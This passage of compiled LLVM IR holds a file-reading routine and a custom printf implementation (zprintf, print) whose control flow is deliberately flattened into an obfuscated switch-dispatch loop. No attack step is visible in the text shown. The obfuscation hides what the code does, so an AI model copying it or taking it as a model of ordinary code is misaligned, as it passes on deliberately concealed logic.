  call void @filter(i8* %64)
  %65 = load i8*, i8** %1, align 8
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %65, i8* %66, i64 %68, i32 1, i1 false)
  %69 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %70 = call i32 @fclose(%struct._IO_FILE* %69)
  store i32 -1776778048, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8*, i8** %1, align 8
  ret i8* %72

loopEnd:                                          ; preds = %59, %56, %52, %47, %41, %40, %37, %28, %23, %22, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

declare i32 @fclose(%struct._IO_FILE*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1636988362, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1636988362, label %12
    i32 -80060878, label %18
    i32 -972277275, label %24
    i32 644922136, label %32
    i32 1964743279, label %33
    i32 -1193942425, label %39
    i32 -268585415, label %40
    i32 -1945515048, label %46
    i32 -1780296170, label %49
    i32 254343271, label %50
    i32 -1172747353, label %56
    i32 280057902, label %61
    i32 214370199, label %62
    i32 1695239330, label %68
    i32 -1305163795, label %73
    i32 -172863726, label %75
    i32 -585815130, label %84
    i32 -1036480976, label %87
    i32 -1102367789, label %93
    i32 -1961898149, label %99
    i32 1221074318, label %105
    i32 -71948835, label %110
    i32 -1104495549, label %118
    i32 1906491845, label %120
    i32 612553705, label %121
    i32 -1315282076, label %127
    i32 -1472310262, label %133
    i32 708423216, label %140
    i32 -145477607, label %146
    i32 -1409394801, label %151
    i32 1838074637, label %158
    i32 341669392, label %164
    i32 717910319, label %171
    i32 -1460682407, label %177
    i32 932851090, label %182
    i32 -1683317857, label %189
    i32 -516281464, label %195
    i32 -878856341, label %202
    i32 368144475, label %208
    i32 -166162299, label %213
    i32 -1773975214, label %220
    i32 1974869107, label %226
    i32 -1777794062, label %233
    i32 -708778758, label %239
    i32 -435004155, label %244
    i32 -616217727, label %251
    i32 -1631319190, label %257
    i32 -1713090001, label %263
    i32 -752056460, label %269
    i32 -697467684, label %274
    i32 -1764612889, label %286
    i32 -1498383441, label %287
    i32 -513008123, label %288
    i32 -1845394612, label %295
    i32 -338171071, label %296
    i32 1854980501, label %299
    i32 1126814579, label %303
    i32 1978070789, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -80060878, i32 1854980501
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -972277275, i32 -1498383441
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 644922136, i32 1964743279
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 1854980501, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1193942425, i32 -268585415
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -513008123, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -1945515048, i32 -1780296170
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1780296170, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 254343271, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -1172747353, i32 280057902
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 254343271, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 214370199, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1695239330, i32 -1305163795
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1305163795, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -172863726, i32 -1036480976
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -585815130, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 214370199, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1102367789, i32 -1315282076
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1961898149, i32 1221074318
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -71948835, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -71948835, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -1104495549, i32 1906491845
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 612553705, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 612553705, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -1472310262, i32 1838074637
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 708423216, i32 -145477607
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -1409394801, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -1409394801, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 341669392, i32 -1683317857
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 717910319, i32 -1460682407
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 932851090, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 932851090, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -516281464, i32 -1773975214
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 -878856341, i32 368144475
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -166162299, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -166162299, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 1974869107, i32 -616217727
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -1777794062, i32 -708778758
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -435004155, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -435004155, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -1631319190, i32 -1764612889
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1713090001, i32 -752056460
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 -697467684, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 -697467684, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1845394612, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -513008123, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -1845394612, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 -338171071, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 1636988362, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
